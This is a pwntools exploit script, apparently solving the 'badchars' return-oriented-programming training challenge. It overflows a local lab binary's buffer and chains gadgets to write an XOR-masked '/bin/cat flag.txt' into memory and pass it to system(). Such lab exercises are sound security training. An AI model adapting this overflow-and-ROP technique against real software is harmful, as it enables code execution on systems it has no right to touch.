from binascii import hexlify
from pwn import *

binary = "./badchars"
context.log_level = "CRITICAL"
context.binary = ELF(binary)
badchars = ELF(binary)
IO = process(binary)
context.log_level = "INFO"

xored = bytes([196, 137, 130, 133, 196, 136, 138, 159, 203, 141, 135, 138, 140, 197, 159, 147, 159, 235])

#Addresses
main = p64(badchars.symbols[b'main'])
system = p64(badchars.plt[b'system'])
_start = p64(badchars.symbols[b'_start'])
padding = 40 * b'\x90'
ret = p64(0x400bcc)                                 # ret in _fini
usefulGadgets = p64(badchars.symbols[b'usefulGadgets'])  # xor byte[r15], r14b WORKS
move = p64(0x400b34)                                # mov qword[r13], r12
pop_rdi = p64(0x0000000000400b39)                   # pop rdi ; ret
pop_r12_r13 = p64(0x0000000000400b3b)               # pop r12 ; pop r13 ; ret
pop_r14_r15 = p64(0x0000000000400b40)               # pop r14 ; pop r15 ; ret
write_addr = 0x6010b0
string = (18 * b'\xeb').ljust(32, b'\x00')          # length 18 inclusive trailing \x00

chunk = (string[index:index + 8] for index in range(0, len(string), 8))

payload_1 = padding + pop_r12_r13 + next(chunk) + p64(write_addr + 0) + move + ret + _start
payload_2 = padding + pop_r12_r13 + next(chunk) + p64(write_addr + 8) + move + ret + _start 
payload_3 = padding + pop_r12_r13 + next(chunk) + p64(write_addr + 16) + move + ret + pop_r14_r15 +  p64(196) + p64(write_addr) + usefulGadgets + _start

IO.recvuntil("> ")
IO.sendline(payload_1)
IO.recvuntil("> ")
IO.sendline(payload_2)
IO.recvuntil("> ")
IO.sendline(payload_3)
payloads = []
for _ in range(1, len(xored) - 1):
    IO.recvuntil("> ")
    payload = padding + pop_r14_r15 + p64(xored[_]) + p64(write_addr + _) + usefulGadgets + ret + _start
    IO.sendline(payload)


IO.recvuntil("> ")
IO.sendline(padding + pop_r14_r15 + p64(xored[17]) + p64(write_addr + 17) + usefulGadgets + ret + _start)
IO.recvuntil("> ")
IO.sendline(padding + pop_rdi + p64(write_addr) + ret + system)
out = IO.recvall(timeout=0.3)
log.info(out.decode())
